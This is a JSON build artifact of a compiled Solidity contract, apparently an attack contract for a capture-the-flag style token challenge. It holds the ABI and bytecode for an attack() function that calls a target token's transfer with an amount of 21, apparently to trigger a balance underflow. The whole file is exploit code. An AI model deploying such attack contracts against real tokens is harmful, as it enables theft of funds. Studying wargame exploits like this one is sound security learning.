{"abi":[{"type":"constructor","inputs":[{"name":"_tokenAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"getBalance","inputs":[{"name":"_owner","type":"address","internalType":"address"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"token","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IToken"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b5060405161028c38038061028c8339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610227806100656000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80639e5faafc14610046578063f8b2cb4f14610050578063fc0c546a14610088575b600080fd5b61004e6100ac565b005b6100766004803603602081101561006657600080fd5b50356001600160a01b0316610149565b60408051918252519081900360200190f35b6100906101e2565b604080516001600160a01b039092168252519081900360200190f35b60008054604080517fa9059cbb000000000000000000000000000000000000000000000000000000008152600481018490526015602482015290516001600160a01b039092169263a9059cbb926044808401936020939083900390910190829087803b15801561011b57600080fd5b505af115801561012f573d6000803e3d6000fd5b505050506040513d602081101561014557600080fd5b5050565b60008054604080517f70a082310000000000000000000000000000000000000000000000000000000081526001600160a01b038581166004830152915191909216916370a08231916024808301926020929190829003018186803b1580156101b057600080fd5b505afa1580156101c4573d6000803e3d6000fd5b505050506040513d60208110156101da57600080fd5b505192915050565b6000546001600160a01b03168156fea2646970667358221220ef3db5fde1bfd0705439619d26da6a55098819c382f5535d7f518b0f943f27ff64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","getBalance(address)":"f8b2cb4f","token()":"fc0c546a"},"id":0}